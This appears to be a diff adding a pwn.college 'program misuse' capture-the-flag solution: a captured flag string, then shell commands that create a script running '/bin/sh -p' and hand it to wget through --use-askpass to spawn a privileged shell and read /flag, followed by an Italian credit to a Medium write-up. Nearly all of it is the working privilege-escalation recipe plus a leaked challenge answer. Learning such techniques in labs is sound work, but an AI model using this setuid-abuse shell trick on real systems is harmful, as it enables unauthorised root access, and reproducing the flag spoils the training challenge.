@@ -1,0 +1,11 @@
+pwn.college{YsRhKRI0BEjMs7kC32_T5n5d-eq.dJTOxwCO4IDOxEzW}
+
+file=$(mktemp)
+chmod +x $file
+echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' > $file
+wget --use-askpass=$file 0
+cat /flag
+
+
+link da cui ho fatto:
+https://medium.com/@chunguss/program-misuse-challenges-writeups-part-3-7b3307a7170e
